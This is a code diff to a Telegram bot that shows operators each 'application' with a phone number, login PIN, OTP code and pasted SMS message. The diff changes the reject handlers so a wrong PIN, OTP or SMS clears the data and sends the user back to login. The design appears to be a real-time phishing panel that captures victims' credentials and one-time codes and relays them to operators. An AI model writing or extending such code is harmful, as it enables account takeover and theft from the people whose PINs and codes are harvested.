@@ -1714,21 +1714,28 @@ Clear all admins operation was cancelled.
 
     // Wrong PIN at OTP stage
     if (action === 'wrongpin' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
+        // Clear OTP and SMS - reset to PIN stage
+        await db.updateApplication(applicationId, { 
+            otp: null,
+            smsMessage: null,
+            otpStatus: 'pending',
+            pinStatus: 'pending'  // Reset to PIN stage
+        });
         await bot.editMessageText(`
 ❌ *WRONG PIN AT OTP STAGE*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-🔢 \`${application.otp}\`
+🔢 OTP: \`${application.otp}\`
 
-⚠️ User's PIN was incorrect
+⚠️ The PIN used at login was incorrect
+User's SMS and OTP data has been cleared.
+User MUST restart from LOGIN with new credentials.
+
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
-
-User will re-enter PIN.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong PIN. User must re-enter all data from login.' });
         return;
     }
 
@@ -1889,18 +1896,18 @@ User will now proceed to OTP.
         console.log(`❌ PIN REJECTED for ${applicationId}`);
 
         await bot.editMessageText(`
-❌ *LOGIN DENIED*
+❌ *LOGIN INVALID*
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
 🔑 PIN: \`${application.pin}\`
 
-✓ User will be sent back to login page
+✓ User will be asked to re-enter their credentials
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login denied. User returned to login page.' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login invalid. User must re-enter all data.' });
     }
 
     // ──────────────────────────────────────
@@ -1948,8 +1955,13 @@ ${application.smsMessage || 'N/A'}
             return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
         }
 
-        await db.updateApplication(applicationId, { otpStatus: 'rejected' });
-        console.log(`❌ SMS REJECTED for ${applicationId}`);
+        // Clear SMS data - user must re-enter from login
+        await db.updateApplication(applicationId, { 
+            smsMessage: null, 
+            otpStatus: 'pending',
+            pinStatus: 'pending'  // Reset back to PIN stage
+        });
+        console.log(`❌ SMS REJECTED - DATA CLEARED for ${applicationId}`);
 
         await bot.editMessageText(`
 ❌ *SMS MESSAGE INVALID*
@@ -1957,17 +1969,20 @@ ${application.smsMessage || 'N/A'}
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
 
-📝 *Message:*
+📝 *Message Received:*
 \`\`\`
 ${application.smsMessage || 'N/A'}
 \`\`\`
 
-✓ User will be asked to paste the correct message
+⚠️ *INVALID MESSAGE*
+User's entire session has been cleared.
+User MUST restart from LOGIN with new credentials.
+
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS invalid. User session cleared - must re-enter all data from login.' });
     }
 
     // ──────────────────────────────────────
@@ -2011,8 +2026,14 @@ ${application.smsMessage || 'N/A'}
             return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
         }
 
-        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
-        console.log(`❌ WRONG OTP CODE for ${applicationId}`);
+        // Clear OTP and SMS data - reset to PIN stage
+        await db.updateApplication(applicationId, { 
+            otp: null,
+            smsMessage: null,
+            otpStatus: 'pending',
+            pinStatus: 'pending'  // Reset to PIN stage
+        });
+        console.log(`❌ WRONG OTP CODE - DATA CLEARED for ${applicationId}`);
 
         await bot.editMessageText(`
 ❌ *WRONG OTP CODE*
@@ -2021,12 +2042,15 @@ ${application.smsMessage || 'N/A'}
 📞 \`${formatPhone(application.phoneNumber)}\`
 🔢 OTP entered: \`${application.otp}\`
 
-✓ User will be asked to re-enter OTP
+⚠️ *INCORRECT CODE*
+User's SMS and OTP data has been cleared.
+User MUST restart from LOGIN with new PIN.
+
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User asked to try again.' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong OTP. User must re-enter all data from login.' });
     }
 });
 
